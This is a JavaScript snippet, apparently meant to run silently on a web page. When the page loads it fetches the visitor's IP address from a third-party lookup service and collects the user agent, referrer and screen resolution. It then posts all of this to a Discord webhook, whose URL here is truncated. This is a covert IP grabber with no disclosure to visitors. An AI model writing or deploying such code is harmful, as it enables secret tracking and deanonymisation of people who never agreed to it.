      const webhookUrl = "https://discord.com/api/webhooks/";

      document.addEventListener("DOMContentLoaded", function() {
        const message = {
          embeds: [
            {
              title: "Visitor Information",
              color: 0xff0000,
              fields: [
                {
                  name: "User Agent",
                  value: navigator.userAgent,
                  inline: false
                },
                {
                  name: "Referrer",
                  value: document.referrer,
                  inline: false
                },
                {
                  name: "Screen Resolution",
                  value: screen.width + "x" + screen.height,
                  inline: false
                },
                {
                  name: "IP Address",
                  value: "",
                  inline: false
                }
              ]
            }
          ]
        };
        fetch("https://api4.my-ip.io/ip.json")
          .then(response => response.json())
          .then(data => {
            message.embeds[0].fields[3].value = data.ip;
            fetch(webhookUrl, {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify(message)
            });
          });
      });
      
